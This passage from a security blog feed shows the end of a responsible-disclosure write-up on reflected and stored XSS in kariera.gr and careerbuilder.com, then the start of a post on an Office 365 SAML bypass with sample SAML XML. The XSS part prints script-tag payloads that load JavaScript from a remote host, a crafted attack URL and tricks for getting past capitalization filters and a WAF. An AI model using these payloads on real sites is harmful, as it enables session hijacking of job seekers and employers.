&lt;img alt="img error attempt 1" src="/images/kariera-3.png" style="width: 67%;" /&gt;
&lt;/div&gt;
&lt;p&gt;but no JavaScript was executed. Checking the source, I got the following:&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="img error attempt 2" src="/images/kariera-4.png" style="width: 80%;" /&gt;
&lt;/div&gt;
&lt;p&gt;That should pop right? Wrong. JavaScript functions are of course case sensitive and &lt;strong&gt;Confirm()&lt;/strong&gt; is not the same as &lt;strong&gt;confirm()&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Security by UX&lt;/em&gt; as the web developer obviously thought that it would look nice if they capitalized the first letter of any given &amp;quot;word&amp;quot;..&lt;/p&gt;
&lt;p&gt;But then, it hit me. I might not be able to inject &amp;lt;script&amp;gt; tags with inline Javasript code to be executed, both because of the capitalization of words and the fact that full tags are escaped, but if I can use an open &lt;em&gt;&amp;lt;img&lt;/em&gt; tag, then I could use an open &lt;em&gt;&amp;lt;script&lt;/em&gt; tag to load a malicious script from a remote server. CSP might cause a problem, but it didn't feel like they would have
bothered with using CSP in the first place. I took a look at the response headers and verified my thoughts&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="kariera.gr response headers" src="/images/kariera-response-headers.png" style="width: 80%;" /&gt;
&lt;/div&gt;
&lt;p&gt;First attempt with this kind of payload was &lt;em&gt;&amp;lt;script src=&amp;quot;http://XXX.XXX.XXX.XXX/testxss/mal.js&amp;quot;&lt;/em&gt; where mal.js contained just an alert. Shockingly enough, I did not get anything from the browser. I took a look at my server logs to see if everything was ok and the culprit revealed itself :&lt;/p&gt;
&lt;p&gt;&lt;em&gt;[31/Mar/2016:17:56:25 +0300] &amp;quot;GET *&lt;/em&gt;/Testxss/Mal.Js** HTTP/1.1&amp;quot; 404 703 *&lt;/p&gt;
&lt;p&gt;Sure enough the capitalization function had messed up the payload before reflecting it back to me, which caused a request to the wrong path. Quick solution was to host my JavaScript in a all capital path and name it MAL.JS so that the payload became : &lt;em&gt;&amp;lt;script src=&amp;quot;http://XXX.XXX.XXX.XXX/TESTXSS/MAL.JS&amp;quot;&lt;/em&gt; (XSS RAGE!!!). Hit the search button and got an alert box&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="Reflected XSS" src="/images/kariera-reflected-xss.png" style="width: 80%;" /&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="stored-xss"&gt;
&lt;h3&gt;Stored XSS&lt;/h3&gt;
&lt;p&gt;So, if these controls are in place for the search input, what would be different for other user related input?&lt;/p&gt;
&lt;p&gt;Nothing, as it turns out.&lt;/p&gt;
&lt;p&gt;I created a test user and soon enough identified that most of the user form data are vulnerable to the same payload that was used in the search form&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="Registration form" src="/images/kariera-registration-form.png" style="width: 50%;" /&gt;
&lt;/div&gt;
&lt;p&gt;So I set my first name as &lt;em&gt;Χρήστος&amp;lt;script src=&amp;quot;http://XXX.XXX.XXX.XXX/TESTXSS/MAL.JS&amp;quot;&lt;/em&gt;, successfully submitted the form, and upon reload I was greeted by yet another alert box&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="kariera.gr stored  XSS" src="/images/kariera-stored-xss.png" style="width: 50%;" /&gt;
&lt;/div&gt;
&lt;p&gt;The same payload was used on other input fields of the registration form but the vulnerability was prevalent in all parts of the web application. For example, I was able to upload a CV with the name &lt;em&gt;my_cv&amp;lt;script src=&amp;quot;https://XXX.XXX.XXX.XXX/TESTXSS/MAL.JS&amp;quot;&lt;/em&gt;, and it would be happily consumed, resulting in the following anytime I accessed my CV page.&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="kariera.gr stored  XSS CV" src="/images/kariera-stored-xss-cv.png" style="width: 50%;" /&gt;
&lt;/div&gt;
&lt;p&gt;What's interesting, is why exactly this payload works. Let's take a look at the source code:&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="kariera.gr stored  XSS source" src="/images/kariera-stored-xss-source.png" style="width: 50%;" /&gt;
&lt;/div&gt;
&lt;p&gt;Starting on line 131 we see our payload injected. The &lt;em&gt;&amp;lt;/h3&amp;gt;&lt;/em&gt; on line 132, and the closing &lt;em&gt;&amp;gt;&lt;/em&gt; in particular closes our &amp;lt;script&amp;gt; which effectively becomes&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://XXX.XXX.XXX.XXX/TESTXSS/MAL.JS&amp;quot;&lt;/span&gt; &lt;span class="err"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="na"&gt;h3&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The script is closed by the closing &lt;em&gt;&amp;lt;/script&amp;gt;&lt;/em&gt; tag in line 462 and everything in between is not rendered.&lt;/p&gt;
&lt;p&gt;Depending on the distance between where our payload is injected in the page and the next &lt;em&gt;&amp;lt;/script&amp;gt;&lt;/em&gt; closing tag, a lot oh HTML/JS can be disregarded, which might affect how the page is rendered in the victim's browser. On the other hand we can inject anything we want from our mal.js script so with a little more work we can make the page look as benign as the original.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="going-global"&gt;
&lt;h3&gt;Going Global&lt;/h3&gt;
&lt;p&gt;Having identified these issues in the Greek version of the website, I thought that since all the careerbuilder network websites look pretty much similar, they are based
on the same implementation and thus vulnerable to the same attacks. Since, obviously, the impact of a stored XSS on careerbuilder.com is much bigger than one on kariera.gr, I pointed my browser to www.careerbuilder.com and used the same payload. Well, tough luck..&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="careerbuilder.com WAF" src="/images/kariera-waf.png" style="width: 50%;" /&gt;
&lt;/div&gt;
&lt;p&gt;It looks like they are using some kind of Web Application Firewall that detects the XSS payload in the request and denies it. The same was true for all my attempts to create an account in careerbuilder.com injecting the payloads in the form fields or CV uploads as before. The same, unsuccessful, results in all the other national versions of the careerbuilder websites. All that I checked were protected by the same WAF.&lt;/p&gt;
&lt;p&gt;But, all the above versions of the website have something in common. The user account repository. In short, I could create an account in kariera.gr which is vulnerable, and then use these credentials to log in to www.careerbuilder.com, where I got the following&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="kariera.gr stored  XSS" src="/images/careerbuilder-stored-xss.png" style="width: 50%;" /&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="threat-model"&gt;
&lt;h3&gt;Threat Model&lt;/h3&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Unregistered_attacker: An attacker with no account on the website could create a crafted URL and trick a victim into requesting the URL, which would cause the user's browser to execute arbitrary JavaScript code. This would not work on Chrome, as the XSS protection kicks in and mitigates the reflected XSS attempt.&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;https://www.kariera.gr/intl/jobseeker/jobs/jrp.aspx?HdnIFlexSearchBox=1&lt;span class="err"&gt;&amp;amp;&lt;/span&gt;_ctl7%3AucSearchBox%3A_ctl0%3ActrlSearch%3AhihLanguage=GRGreek&lt;span class="err"&gt;&amp;amp;&lt;/span&gt;IPath=QH&lt;span class="err"&gt;&amp;amp;&lt;/span&gt;sc_cmp1=JS_GR_QSB_GEN&lt;span class="err"&gt;&amp;amp;&lt;/span&gt;_ctl7%3AucSearchBox%3A_ctl0%3ActrlSearch%3AMXJobSrchCriteria_Rawwords=%22%2F%3Esecurity+%3Cscript+src%3D%22https%3A%2F%2F1.1.1.1%2FTESTXSS%2FMAL.JS%22&lt;span class="err"&gt;&amp;amp;&lt;/span&gt;_ctl7%3AucSearchBox%3A_ctl0%3ActrlSearch%3AMXJobSrchCriteria_City1=%CE%91%CE%B8%CE%AE%CE%BD%CE%B1&lt;span class="err"&gt;&amp;amp;&lt;/span&gt;sbmt=%CE%95%CF%8D%CF%81%CE%B5%CF%83%CE%B7+%CE%91%CE%B3%CE%B3%CE%B5%CE%BB%CE%B9%CF%8E%CE%BD&lt;span class="err"&gt;&amp;amp;&lt;/span&gt;_ctl7%3AucSearchBox%3A_ctl0%3ActrlSearch%3AMXJobSrchCriteria_States=
&lt;/pre&gt;&lt;/div&gt;
&lt;ol class="arabic simple" start="2"&gt;
&lt;li&gt;Registered_attacker: An attacker with an account on the website could edit their contact details in order to include arbitrary externally hosted JavaScript. Then,the browser of anyone seeing their profile, or their contact details if included in search results or other views would execute that. Potential victims include employers looking for candidates, site administrators, etc.&lt;/li&gt;
&lt;li&gt;Registered_employer: An attacker with an employer account on the website could upload a job advert with arbitrary externally hosted JavaScript.Then,the browser of anyone seeing that advert, or if it was returned in a search result would execute that. Potential victims include candidates looking for jobs, site administrators, etc.&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="disclosure-timeline"&gt;
&lt;h2&gt;Disclosure Timeline&lt;/h2&gt;
&lt;blockquote&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;01/04/2016: Contacted &lt;a class="reference external" href="mailto:TSST&amp;#64;careerbuilder.com"&gt;TSST&amp;#64;careerbuilder.com&lt;/a&gt; looking for a contact where I could disclose my report.&lt;/li&gt;
&lt;li&gt;01/04/2016: Trust and Site Security Team replied that I could share the report with them.&lt;/li&gt;
&lt;li&gt;04/04/2016: Sent the detailed report to TSST including PoCs and screenshots.&lt;/li&gt;
&lt;li&gt;25/04/2016: Sent a reminder to TSST inquiring about the process.&lt;/li&gt;
&lt;li&gt;10/05/2016: Sent a reminder to TSST inquiring about the process.&lt;/li&gt;
&lt;li&gt;10/05/2016: TSST replied that they are looking into the matter.&lt;/li&gt;
&lt;li&gt;26/05/2016: Sent a reminder to TSST inquiring about the process.&lt;/li&gt;
&lt;li&gt;26/05/2016: TSST replied that the WAF has been deployed in all their national websites, thus they consider the issue solved.&lt;/li&gt;
&lt;li&gt;06/06/2016: Public Disclosure.&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;/div&gt;
</summary><category term="XSS"></category></entry><entry><title>The road to hell is paved with SAML Assertions</title><link href="http://www.economyofmechanism.com/office365-authbypass.html" rel="alternate"></link><updated>2016-04-27T12:40:00+03:00</updated><author><name>Ioannis Kakavas</name></author><id>tag:www.economyofmechanism.com,2016-04-27:office365-authbypass.html</id><summary type="html">&lt;div class="section" id="tl-dr"&gt;
&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;A vulnerability in Microsoft Office 365 SAML Service Provider implementation allowed for cross domain authentication bypass affecting &lt;strong&gt;all&lt;/strong&gt; federated domains. An attacker exploiting this vulnerability could gain unrestricted access to a victim's Office 365 account, including access to their email, files stored in OneDrive etc.&lt;/p&gt;
&lt;p&gt;This vulnerability was jointly discovered by Klemen Bratec from &lt;a class="reference external" href="http://www.sola-prihodnosti.si/en/"&gt;Šola prihodnosti Maribor&lt;/a&gt;, and Ioannis Kakavas from &lt;a class="reference external" href="http://www.grnet.gr"&gt;Greek Research and Technology Network&lt;/a&gt; and this blog post is cross-posted here and on &lt;a class="reference external" href="https://bratec.si/security/2016/04/27/road-to-hell-paved-with-saml-assertions.html"&gt;Klemen's blog&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Microsoft fixed the vulnerability within &lt;strong&gt;7 hours&lt;/strong&gt; of our report and handled the disclosure process admirably.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="short-saml-introduction"&gt;
&lt;h2&gt;Short SAML introduction&lt;/h2&gt;
&lt;p&gt;&lt;tt class="docutils literal"&gt;Well, wait, I lost you on the 8th word, what is SAML ?&lt;/tt&gt;&lt;/p&gt;
&lt;p&gt;SAML stands for Security Assertion Markup Language and is an XML-based standard for exchanging authentication and authorization data between parties. The prominent use of SAML is
for Cross Domain Web Single-Sign-On.
This is an overview of the SAML 2.0 Web Browser SSO Profile, short enough to get the gist of it so you can understand the following sections, long enough to bore you if you are
familiar with SAML already, so feel free to skip to &lt;a class="reference internal" href="#how-office-365-saml-implementation-works"&gt;How Office 365 SAML implementation works&lt;/a&gt;.&lt;/p&gt;
&lt;div class="section" id="important-concepts"&gt;
&lt;h3&gt;Important Concepts&lt;/h3&gt;
&lt;p&gt;This section focuses on SAML 2.0. The most important components of the SAML specification are the following:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Assertions&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Assertions are XML structures that contain packaged security information about the user. The two mostly used assertion types are&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Authentication Assertions that contain the information that the user has proven their identity&lt;/li&gt;
&lt;li&gt;Attribute Assertions that contain specific information about the user in the format of attributes ( such as email address, name, etc. )&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Protocols&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;SAML protocols describe how certain SAML elements (including assertions) are packaged within request and response elements, and gives the processing rules that SAML entities must follow when producing or consuming these elements. The Authentication Request Protocol is described later on.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Bindings&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;SAML bindings describe how a SAML message must be mapped on non SAML related messaging formats and communication protocols. For instance the &lt;em&gt;HTTP Redirect Binding&lt;/em&gt; defines how SAML messages are formatted when carried directly in the URL query string of an HTTP GET request. A SAML request is transmitted via an SAMLRequest query parameter, the value of which is deflated, base64 encoded and URL encoded.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Identity Provider&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The identity provider is the SAML authority that holds the information about users and can issue assertions for them to use in Service Providers.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Service Provider&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The service provider is the SAML consumer that consumes the information (in the form of assertions) about the users in order to allow them access to resources.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="web-browser-sso-example"&gt;
&lt;h3&gt;Web Browser SSO Example&lt;/h3&gt;
&lt;p&gt;A simple example of the Web Browser SSO Profile is the case where the service provider uses the HTTP Redirect binding and the identity provider uses the HTTP POST binding. The actors involved are&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;The principal (user) using a browser&lt;/li&gt;
&lt;li&gt;The Identity Provider&lt;/li&gt;
&lt;li&gt;The Service Provider&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="figure"&gt;
&lt;img alt="SAML2.0 Web Browser SSO Profile example" src="/images/SAMLwebsso.png" /&gt;
&lt;p class="caption"&gt;SAML2.0 Web Browser SSO Profile Example&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;It all starts with a user attempting to access a protected resource at some service (or explicitly asking to log in). The service is configured to allow/enforce federated login and as such presents or redirects the user
to a Discovery Service interface in order to select their Identity Provider. Upon user selection, and given that it knows and trusts the selected Identity Provider, the Service Provider creates a SAML Authentication Request that looks like this:&lt;/p&gt;
&lt;pre class="code xml literal-block"&gt;
&lt;span class="nt"&gt;&amp;lt;samlp:AuthnRequest&lt;/span&gt; &lt;span class="na"&gt;xmlns:samlp=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:protocol&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;ID=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;_bec424fa5103428909a30ff1e31168327f79474984&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Version=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2.0&amp;quot;&lt;/span&gt;
                    &lt;span class="na"&gt;IssueInstant=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2016-04-14T11:39:34Z&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;ForceAuthn=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;false&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;IsPassive=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;false&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;ProtocolBinding=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST&amp;quot;&lt;/span&gt;
                    &lt;span class="na"&gt;AssertionConsumerServiceURL=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://myserviceprovider.atsomeorg.com/Shibboleth.sso/SAML2/POST&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;saml:Issuer&lt;/span&gt; &lt;span class="na"&gt;xmlns:saml=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:assertion&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;https://myserviceprovider.atsomeorg.com/shibboleth&lt;span class="nt"&gt;&amp;lt;/saml:Issuer&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;samlp:NameIDPolicy&lt;/span&gt; &lt;span class="na"&gt;xmlns:samlp=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:protocol&amp;quot;&lt;/span&gt;
            &lt;span class="na"&gt;Format=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:nameid-format:transient&amp;quot;&lt;/span&gt;
            &lt;span class="na"&gt;AllowCreate=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;true&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/samlp:AuthnRequest&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;em&gt;Issuer&lt;/em&gt; is the EntityID of the Service Provider which is a URI like string that uniquely identifies it. The &lt;em&gt;Issuer&lt;/em&gt; denotes which Service Provider requests the user authentication.&lt;/li&gt;
&lt;li&gt;&lt;em&gt;IssueIstant&lt;/em&gt; indicates when this request is made and the &lt;em&gt;ID&lt;/em&gt; is an internal identifier that the Service Provider uses to match the SAML Response that it will later receive to the originating request.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The user's browser is then redirected to the respective URL at the Identity Provider depending on the binding that is used and that SAML Authentication Request is passed as a string query parameter in the HTTP GET ( after it has been deflated , base64 encoded and URL encoded ).&lt;/p&gt;
&lt;p&gt;Upon receiving the SAML Request, the Identity Provider checks that it knows and trusts the Service Provider that sends it, validates the contents of the Request  and prompts the user for authentication. If the
user authenticates successfully, the Identity Provider generates a SAML response, that looks something like this:&lt;/p&gt;
&lt;pre class="code xml literal-block"&gt;
&lt;span class="nt"&gt;&amp;lt;samlp:Response&lt;/span&gt; &lt;span class="na"&gt;xmlns:samlp=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:protocol&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;xmlns:saml=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:assertion&amp;quot;&lt;/span&gt;
                &lt;span class="na"&gt;ID=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e6&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Version=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2.0&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;IssueInstant=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2016-04-14T11:40:48Z&amp;quot;&lt;/span&gt;
                &lt;span class="na"&gt;Destination=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://myserviceprovider.atsomeorg.com/Shibboleth.sso/SAML2/POST&amp;quot;&lt;/span&gt;
                &lt;span class="na"&gt;InResponseTo=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;_bec424fa5103428909a30ff1e31168327f79474984&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;saml:Issuer&amp;gt;&lt;/span&gt;http://idp.example.com/idp/shibboleth&lt;span class="nt"&gt;&amp;lt;/saml:Issuer&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;samlp:Status&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;samlp:StatusCode&lt;/span&gt; &lt;span class="na"&gt;Value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:status:Success&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;/samlp:Status&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;saml:Assertion&lt;/span&gt; &lt;span class="na"&gt;xmlns:xsi=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;xmlns:xs=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot;&lt;/span&gt;
                 &lt;span class="na"&gt;ID=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;pfx65c8c6cd-b03b-8634-fd54-636fa66e7722&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Version=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2.0&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;IssueInstant=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2016-04-14T11:40:48Z&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;saml:Issuer&amp;gt;&lt;/span&gt;http://idp.example.com/idp/shibboleth&lt;span class="nt"&gt;&amp;lt;/saml:Issuer&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;ds:Signature&lt;/span&gt; &lt;span class="na"&gt;xmlns:ds=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2000/09/xmldsig#&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;ds:SignedInfo&amp;gt;&amp;lt;ds:CanonicalizationMethod&lt;/span&gt; &lt;span class="na"&gt;Algorithm=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2001/10/xml-exc-c14n#&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;ds:SignatureMethod&lt;/span&gt; &lt;span class="na"&gt;Algorithm=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2000/09/xmldsig#rsa-sha1&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;ds:Reference&lt;/span&gt; &lt;span class="na"&gt;URI=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;#pfx65c8c6cd-b03b-8634-fd54-636fa66e7722&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;ds:Transforms&amp;gt;&amp;lt;ds:Transform&lt;/span&gt; &lt;span class="na"&gt;Algorithm=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2000/09/xmldsig#enveloped-signature&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;ds:Transform&lt;/span&gt; &lt;span class="na"&gt;Algorithm=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2001/10/xml-exc-c14n#&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;/ds:Transforms&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;ds:DigestMethod&lt;/span&gt; &lt;span class="na"&gt;Algorithm=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2000/09/xmldsig#sha1&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;ds:DigestValue&amp;gt;&lt;/span&gt;gxnHkIizISbLkkB1vSWapmWuQzk=&lt;span class="nt"&gt;&amp;lt;/ds:DigestValue&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;/ds:Reference&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;/ds:SignedInfo&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;ds:SignatureValue&amp;gt;&lt;/span&gt;Qn69P4a3PQTISfqk/0t2JdJqG1nlswFQt8bNWPZ+K41EIYkCcTyuwlKnCzlTvU1YgNXIvHcFEyKjYAge+s3gwqecATI+yRB9OtD34YxBC4kyGcbq/ETQxIQ515xehfRxLrQjUpRzgHQXMLSjGdgjeelfKsHeSczA9Hp44kasQSs=&lt;span class="nt"&gt;&amp;lt;/ds:SignatureValue&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;ds:KeyInfo&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;ds:X509Data&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;ds:X509Certificate&amp;gt;&lt;/span&gt;MIICajCCAdOgAwIBAgIBADANBgkqhkiG9w0BAQ0FADBSMQswCQYDVQQGEwJ1czETMBEGA1UECAwKQ2FsaWZvcm5pYTEVMBMGA1UECgwMT25lbG9naW4gSW5jMRcwFQYDVQQDDA5zcC5leGFtcGxlLmNvbTAeFw0xNDA3MTcxNDEyNTZaFw0xNTA3MTcxNDEyNTZaMFIxCzAJBgNVBAYTAnVzMRMwEQYDVQQIDApDYWxpZm9ybmlhMRUwEwYDVQQKDAxPbmVsb2dpbiBJbmMxFzAVBgNVBAMMDnNwLmV4YW1wbGUuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDZx+ON4IUoIWxgukTb1tOiX3bMYzYQiwWPUNMp+Fq82xoNogso2bykZG0yiJm5o8zv/sd6pGouayMgkx/2FSOdc36T0jGbCHuRSbtia0PEzNIRtmViMrt3AeoWBidRXmZsxCNLwgIV6dn2WpuE5Az0bHgpZnQxTKFek0BMKU/d8wIDAQABo1AwTjAdBgNVHQ4EFgQUGHxYqZYyX7cTxKVODVgZwSTdCnwwHwYDVR0jBBgwFoAUGHxYqZYyX7cTxKVODVgZwSTdCnwwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQ0FAAOBgQByFOl+hMFICbd3DJfnp2Rgd/dqttsZG/tyhILWvErbio/DEe98mXpowhTkC04ENprOyXi7ZbUqiicF89uAGyt1oqgTUCD1VsLahqIcmrzgumNyTwLGWo17WDAa1/usDhetWAMhgzF/Cnf5ek0nK00m0YZGyc4LzgD0CROMASTWNg==
       &lt;span class="nt"&gt;&amp;lt;/ds:X509Certificate&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;/ds:X509Data&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;/ds:KeyInfo&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;/ds:Signature&amp;gt;&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;lt;saml:Subject&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;saml:NameID&lt;/span&gt; &lt;span class="na"&gt;SPNameQualifier=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://myserviceprovider.atsomeorg.com/shibboleth&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Format=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:nameid-format:transient&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;_ce3d2948b4cf20146dee0a0b3dd6f69b6cf86f62d7&lt;span class="nt"&gt;&amp;lt;/saml:NameID&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;saml:SubjectConfirmation&lt;/span&gt; &lt;span class="na"&gt;Method=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;saml:SubjectConfirmationData&lt;/span&gt; &lt;span class="na"&gt;NotOnOrAfter=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2016-04-14T11:50:48Z&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Recipient=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://myserviceprovider.atsomeorg.com/Shibboleth.sso/SAML2/POST&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;InResponseTo=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;_bec424fa5103428909a30ff1e31168327f79474984&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
